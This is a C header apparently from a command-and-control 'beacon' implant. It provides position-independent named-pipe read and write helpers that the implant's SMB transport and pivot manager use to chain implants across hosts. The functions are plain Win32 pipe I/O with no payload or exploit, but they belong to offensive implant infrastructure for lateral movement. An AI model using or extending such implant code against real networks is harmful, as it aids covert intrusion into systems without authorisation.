/* beacon/include/Pipe.h
 * Shared overlapped named-pipe I/O helpers used by both the SMB transport
 * (child-side server) and the pivot manager (parent-side client).
 *
 * Both helpers are FUNC static so they land in .text$B and remain PIC-safe.
 * NAX_PIPE_CHUNK_SIZE controls the write chunk size (defined in NaxConstants.h). */

#pragma once
#include "Nax.h"

/* ========= [ NaxPipeWrite - write length-prefixed message in chunks ] ========= */

FUNC static BOOL NaxPipeWrite( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, const PBYTE data, UINT32 size ) {
    OVERLAPPED ov;
    MmZero( &ov, sizeof( ov ) );
    ov.hEvent = hEvent;
    DWORD written = 0;

    Nax->Kernel32.ResetEvent( hEvent );
    if ( ! Nax->Kernel32.WriteFile( hPipe, &size, 4, &written, &ov ) ) {
        if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING )
            Nax->Kernel32.GetOverlappedResult( hPipe, &ov, &written, TRUE );
        else
            return FALSE;
    }

    UINT32 idx = 0;
    while ( idx < size ) {
        UINT32 chunk = ( size - idx > NAX_PIPE_CHUNK_SIZE ) ? NAX_PIPE_CHUNK_SIZE : ( size - idx );
        MmZero( &ov, sizeof( ov ) );
        ov.hEvent = hEvent;
        written   = 0;
        Nax->Kernel32.ResetEvent( hEvent );
        if ( ! Nax->Kernel32.WriteFile( hPipe, data + idx, chunk, &written, &ov ) ) {
            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING )
                Nax->Kernel32.GetOverlappedResult( hPipe, &ov, &written, TRUE );
            else
                return FALSE;
        }
        idx += written;
    }
    return TRUE;
}

/* ========= [ NaxPipeRead - read exact byte count in chunks ] ========= */

FUNC static BOOL NaxPipeRead( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, PBYTE buf, UINT32 size ) {
    UINT32 idx = 0;
    while ( idx < size ) {
        OVERLAPPED ov;
        MmZero( &ov, sizeof( ov ) );
        ov.hEvent = hEvent;
        DWORD nRead = 0;
        Nax->Kernel32.ResetEvent( hEvent );
        if ( ! Nax->Kernel32.ReadFile( hPipe, buf + idx, size - idx, &nRead, &ov ) ) {
            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING )
                Nax->Kernel32.GetOverlappedResult( hPipe, &ov, &nRead, TRUE );
            else
                return FALSE;
        }
        idx += nRead;
    }
    return TRUE;
}
